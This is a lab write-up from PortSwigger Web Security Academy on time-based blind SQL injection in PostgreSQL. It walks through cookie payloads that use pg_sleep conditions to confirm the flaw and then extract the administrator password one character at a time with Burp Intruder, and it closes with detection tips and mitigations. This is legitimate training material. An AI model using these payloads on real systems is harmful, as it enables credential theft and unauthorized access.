# Blind SQL Injection with Time Delays and Information Retrieval

| Property       | Value                            |
| -------------- | -------------------------------- |
| **Category**   | SQL Injection                    |
| **Difficulty** | Practitioner                     |
| **Platform**   | PortSwigger Web Security Academy |
| **Status**     | ✅ Completed                      |

---

## Skills Demonstrated

* Blind SQL Injection
* Time-Based SQL Injection
* Burp Suite Repeater
* Burp Suite Intruder
* PostgreSQL
* Response Time Analysis
* Password Enumeration

---

# Overview

This lab builds upon the previous time-based SQL Injection technique by using response delays to extract sensitive information from the database.

Instead of simply confirming that SQL Injection exists, the attacker uses conditional time delays to determine the administrator's password one character at a time.

---

# Lab Objective

Exploit a Time-Based Blind SQL Injection vulnerability to retrieve the administrator's password.

---

# Understanding the Vulnerability

When an application suppresses both SQL errors and query results, attackers can still extract data by causing the database to pause only when a condition evaluates to **TRUE**.

By measuring response times, each character of a password can be determined individually.

---

# Attack Methodology

1. Confirm Time-Based SQL Injection.
2. Verify that the administrator account exists.
3. Determine the password length.
4. Extract each password character using Burp Suite Intruder.
5. Log in using the recovered credentials.

---

# Solution Walkthrough

## Step 1 – Capture the Request

Open the lab in **Burp Browser**.

Locate the request containing the `TrackingId` cookie and send it to **Burp Suite Repeater**.

---

## Step 2 – Confirm Time-Based SQL Injection

Modify the cookie:

```http
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Observation**

The application delays its response by approximately **5 seconds**.

Now test:

```http
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Observation**

No delay occurs, confirming that the delay depends on the SQL condition.

---

## Step 3 – Verify the Administrator Account

Use:

```http
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

**Observation**

A 5-second delay confirms that the `administrator` account exists.

---

## Step 4 – Determine Password Length

Use:

```http
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

Send the request to **Burp Intruder**.

* Attack Type: **Sniper**
* Payload: Numeric values

Increase the tested length until the delay no longer occurs.

**Observation**

The administrator password is **20 characters long**.

---

## Step 5 – Extract the Password

Modify the payload:

```http
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

Configure **Burp Intruder**:

* **Attack Type:** Cluster Bomb
* **Payload Set 1:** Numbers (1–20)
* **Payload Set 2:** Characters (`a-z`, `0-9`)

Create a **Resource Pool** with:

* Maximum concurrent requests: **1**

This ensures accurate response timing.

Start the attack.

**Observation**

Responses taking approximately **5 seconds** indicate the correct character for each password position.

The password is reconstructed one character at a time. The original password from the lab has been replaced with `<ADMINISTRATOR_PASSWORD>` in this documentation.

---

## Step 6 – Log In

Use the recovered administrator credentials to authenticate and complete the lab.

---

# Payload Analysis

### `CASE WHEN`

Evaluates a condition before deciding whether to trigger a delay.

### `pg_sleep(5)`

Pauses query execution for five seconds when the condition is TRUE.

### `LENGTH(password)`

Determines the total password length.

### `SUBSTRING(password, position, 1)`

Extracts one character from the administrator password.

---

# Why the Attack Works

The application never displays database output, but the execution time varies depending on whether the injected SQL condition is TRUE or FALSE.

This timing difference becomes the attacker's communication channel, allowing sensitive information to be extracted without visible query results.

---

# Detection Tips

Security testers can identify this vulnerability by:

* Measuring response time differences.
* Testing conditional delay functions.
* Comparing TRUE and FALSE conditions.
* Repeating requests to eliminate network latency.

---

# Common Mistakes

* Forgetting to configure a Resource Pool with one concurrent request.
* Using the wrong attack type in Burp Intruder.
* Confusing network delays with SQL-induced delays.
* Attempting password extraction before determining the password length.

---

# Real-World Scenario

Many modern applications suppress database errors and display identical responses for all requests.

Time-Based Blind SQL Injection enables attackers to retrieve sensitive information solely by measuring response times, making it one of the most reliable techniques for exploiting heavily restricted applications.

---

# Mitigation

Developers should:

* Use parameterized queries.
* Never concatenate user input into SQL statements.
* Monitor abnormal query execution times.
* Apply least-privilege database permissions.
* Perform regular SQL Injection testing.

---

# Key Takeaways

* Time delays can be used to extract sensitive data without visible output.
* Burp Intruder automates character-by-character password recovery.
* Accurate timing requires controlled request concurrency.
* Parameterized queries remain the strongest defense against SQL Injection.

---

# References

* PortSwigger Web Security Academy
* OWASP SQL Injection Prevention Cheat Sheet
* PostgreSQL Documentation

---

> **Disclaimer:** This write-up documents a PortSwigger Web Security Academy lab completed in an authorized training environment for educational purposes only.
